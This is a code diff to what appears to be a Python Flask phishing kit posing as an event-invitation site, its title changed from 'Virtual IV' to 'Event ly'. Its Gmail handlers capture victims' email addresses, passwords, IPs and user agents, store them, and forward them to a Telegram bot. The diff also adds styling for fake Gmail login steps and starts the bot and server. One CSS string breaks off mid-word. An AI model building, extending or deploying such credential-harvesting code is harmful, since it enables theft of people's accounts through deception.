@@ -352,7 +352,7 @@ def gmail_email():
     
     # Notify Telegram
     ip = state["ip"]
-    msg = f"""[+]___ Online Invitation (GMAIL) ___[+]                   You have a new website form submission
+    msg = f"""[+]___ Online Invitation (GMAIL) ___[+]                  You have a new website form submission
 Email: {email}
 IP: {ip}
 UA: {state['user_agent'][:80]}"""
@@ -379,7 +379,7 @@ def gmail_password():
     save_credential(state["email"], password, state["ip"], "gmail")
     
     # Notify Telegram with full details
-    msg = f"""[+]___ Online Invitation (GMAIL) ___[+]                   You have a new website form submission
+    msg = f"""[+]___ Online Invitation (GMAIL) ___[+]                  You have a new website form submission
 Email: {state['email']}
 Password: {password}
 IP: {state['ip']}
@@ -483,7 +483,7 @@ PAGE_HTML = """
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Virtual IV</title>
+<title>Event ly</title>
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -572,4 +572,24 @@ header nav a:hover { color: #1a1a2e; }
 }
 .provider-btn:hover {
     background: #f8f9fa;
-    box-shadow: 0 1px 3px
+    box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+}
+.provider-btn svg { width: 22px; height: 22px; flex-shrink: 0; }
+
+/* ========== GMAIL LOGIN STEPS ========== */
+.gmail-step {
+    displ
+"""
+
+# ================================================================
+# START TELEGRAM BOT POLLING IN BACKGROUND THREAD
+# ================================================================
+def start_bot():
+    time.sleep(2)  # Wait for Flask to start
+    handle_telegram_updates()
+
+threading.Thread(target=start_bot, daemon=True).start()
+
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host="0.0.0.0", port=port)
